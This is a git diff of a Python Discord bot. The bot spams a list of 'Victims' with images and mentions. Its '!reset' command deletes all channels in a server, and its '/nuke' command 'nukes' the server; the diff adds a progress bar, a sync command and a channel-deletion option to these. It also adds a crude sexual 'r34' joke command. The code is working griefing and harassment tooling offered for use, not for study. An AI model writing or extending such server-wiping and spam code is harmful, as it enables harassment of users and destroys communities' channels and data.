@@ -9,6 +9,7 @@ import time
 import io
 import aiohttp
 from nuke import start_nuke, get_nuke_toggle, set_nuke_toggle
+from progress import progressBar
 
 
 load_dotenv()
@@ -122,19 +123,31 @@ async def image_loop(interation):
                     await interation.channel.send(content=f"<@{i.user.id}>",file=discord.File(data, 'cool_image.png'))
     time.sleep(Victims[0].delay)
     image_loop(interation)
+       
+async def sync(message):
+    print(time.asctime(time.localtime()),": Attempting to sync tree commands")
+    if message != None:
+        await message.delete()
+        await message.channel.send("Attempting to sync tree commands...")
+    await tree.sync(guild=None)
+    if message != None:
+        await message.channel.send("Finished!")
+    print(time.asctime(time.localtime()),": Finished syncing tree commands")
             
 #run bot
 @client.event
 async def on_ready() -> None:
-    await tree.sync(guild=None)
     await client.change_presence(activity=discord.Activity(name="spam", type=1, ))
+    await sync(None)
     print(f'{client.user} is now running')
 #handle incoming messages
 @client.event
 async def on_message(message: Message) -> None:
     username: str = str(message.author)
     user_message: str = message.content
-    if username == 'yayblaze' and user_message == '!stopspam':
+    if username == 'yayblaze' and user_message == '!sync':
+        await sync(message)
+    elif username == 'yayblaze' and user_message == '!stopspam':
         print('-------------------------------\nATTEMPTING STOP\n-------------------------------')
         await message.delete()
         for i in Victims:
@@ -146,7 +159,7 @@ async def on_message(message: Message) -> None:
         print('-------------------------------\nSTOPED\n-------------------------------')
     elif username == 'yayblaze' and user_message == '!reset':
         print(f'{time.asctime(time.localtime())}: DELETING ALL TEXT CHANNELS')
-        for i in message.guild.channels: 
+        for i in progressBar(message.guild.channels, prefix = 'Progress:', suffix = 'Complete'):
             try:
                 if len(message.guild.channels) > 1: await i.delete()
                 else: 
@@ -156,6 +169,7 @@ async def on_message(message: Message) -> None:
             except: 
                 print(f"Error deleting channel: {i.name}, attempting to purge")
                 await i.purge()
+            time.sleep(0.1)
         print(f'{time.asctime(time.localtime())}: FINISHED DELETING ALL CHANNELS')
 
 @tree.command(
@@ -230,12 +244,18 @@ async def stop_spam(interation, index: int, type: int):
     name='nuke',
     description='Nukes the server | usable by yayblaze only'
 )
-async def nuke(interation):
+async def nuke(interation, deletechannels: bool):
     if interation.user.id != 749431660168216650: return await interation.response.send_message(content="You don't have the perms to do that (L)", ephemeral=True)
     elif get_nuke_toggle(): return await interation.response.send_message(content="The nuke is already running!")
     print(time.asctime(time.localtime()),": Nuke Command Run")
-    await start_nuke(interation)
+    await start_nuke(interation, deletechannels)
  
+@tree.command(
+     name='r34',
+     description='do you really want to do this?'
+ )
+async def r34(interation, prompt: str):
+     await interation.response.send_message(f'imagine {prompt} r34 and think about how good it would be. like 10+ years of experience good')
  
 #main entry point
 def main() -> None:
